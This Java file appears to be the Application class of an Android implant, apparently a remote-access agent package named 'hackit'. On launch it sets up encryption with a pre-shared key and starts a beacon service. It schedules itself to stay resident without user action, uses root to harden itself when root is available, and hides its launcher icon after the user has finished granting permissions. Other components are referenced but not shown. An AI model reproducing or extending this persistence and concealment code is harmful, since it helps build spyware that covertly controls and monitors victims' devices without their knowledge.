package com.hackit.agent;

import android.app.Application;
import android.content.Context;

/** Loads config early and keeps the beacon resident without a launcher tap. */
public class AgentApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            Config config = Config.get(this);
            Crypto.init(config.psk);
            NativeBridge.init(this, config, Common.sid(this));
            BeaconService.start(this);
            Scheduler.arm(this);
            Scheduler.kick(this);
            if (Root.available()) {
                Root.harden(this);
            }
            // Stay launchable until the setup wizard has finished; hiding the
            // icon first would strand the user mid-permission chain.
            if (config.hideIcon && Onboard.done(this)) {
                Launcher.setEnabled(this, false);
            }
        } catch (Throwable exc) {
            Log.e("app: " + exc);
        }
    }

    /** Survives on API 21 where {@code getInstance()} is unavailable. */
    static Context ctx() {
        return sSelf;
    }

    private static Context sSelf;

    {
        sSelf = this;
    }
}
